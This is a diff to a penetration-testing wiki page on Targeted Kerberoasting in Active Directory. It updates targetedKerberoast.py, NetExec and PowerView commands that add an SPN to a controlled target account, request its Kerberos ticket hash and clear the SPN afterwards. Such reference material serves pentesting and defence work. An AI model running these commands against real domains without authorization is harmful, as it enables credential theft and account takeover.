@@ -1,5 +1,5 @@
 ---
-authors: ShutdownRepo, sckdev, 0xblank, jamarir
+authors: ShutdownRepo, sckdev, 0xblank, jamarir, azoxlpf
 category: ad
 ---
 
@@ -7,7 +7,7 @@ category: ad
 
 This abuse can be carried out when controlling an object that has a `GenericAll`, `GenericWrite`, `WriteProperty` or `Validated-SPN` over the target. A member of the [Account Operator](../builtins/security-groups) group usually has those permissions.
 
-The attacker can add an SPN (`ServicePrincipalName`) to that account. Once the account has an SPN, it becomes vulnerable to [Kerberoasting](../kerberos/kerberoast.md). This technique is called Targeted Kerberoasting. 
+The attacker can add an SPN (`ServicePrincipalName`) to that account. Once the account has an SPN, it becomes vulnerable to [Kerberoasting](../kerberos/roasting/kerberoast.md). This technique is called Targeted Kerberoasting. 
 
 ::: tabs
 
@@ -19,16 +19,11 @@ From UNIX-like systems, this can be done with [targetedKerberoast.py](https://gi
 targetedKerberoast.py -v -d "$DC_HOST" -u "$USER" -p "$PASSWORD"
 ```
 
----
-**Alternative 1:** Using [bloodyAD](https://github.com/CravateRouge/bloodyAD) and [netexec](https://github.com/Pennyw0rth/NetExec)
+This can also be achieved with [NetExec](https://github.com/Pennyw0rth/NetExec) (Python).
 
+```bash
+nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kerberoasting kerberoastables.txt --targeted-kerberoast "$TARGET"
 ```
-# Add a SPN to attribute to the targeted account
-bloodyAD -d "$DOMAIN" --host "$DC_HOST" -u "$USER" -p "$PASSWORD" set object "$TARGET" servicePrincipalName -v 'http/anything'
-
-nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -H "$NThash" --kerberoasting kerberoastables.txt
-```
-
 
 === Windows
 
@@ -36,18 +31,18 @@ From Windows machines, this can be achieved with [Set-DomainObject](https://powe
 
 ```bash
 # Make sur that the target account has no SPN
-Get-DomainUser 'victimuser' | Select serviceprincipalname
+Get-DomainUser $TARGET_USER | Select serviceprincipalname
 
 # Set the SPN
-Set-DomainObject -Identity 'victimuser' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}
+Set-DomainObject -Identity $TARGET_USER -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}
 
 # Obtain a kerberoast hash
-$User = Get-DomainUser 'victimuser'
+$User = Get-DomainUser $TARGET_USER
 $User | Get-DomainSPNTicket | fl
 
 # Clear the SPNs of the target account
 $User | Select serviceprincipalname
-Set-DomainObject -Identity victimuser -Clear serviceprincipalname
+Set-DomainObject -Identity $TARGET_USER -Clear serviceprincipalname
 ```
 
 The [Invoke-PassTheCert](https://github.com/jamarir/Invoke-PassTheCert) fork can also be used, authenticating through Schannel via [PassTheCert](https://www.thehacker.recipes/ad/movement/schannel/passthecert).
@@ -71,3 +66,7 @@ Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $LdapConnection -Exploi
 
 
 Once the Kerberoast hash is obtained, it can possibly be [cracked](../credentials/cracking.md) to recover the account's password if the password used is weak enough.
+
+## Resources
+
+[https://www.netexec.wiki/ldap-protocol/kerberoasting](https://www.netexec.wiki/ldap-protocol/kerberoasting)
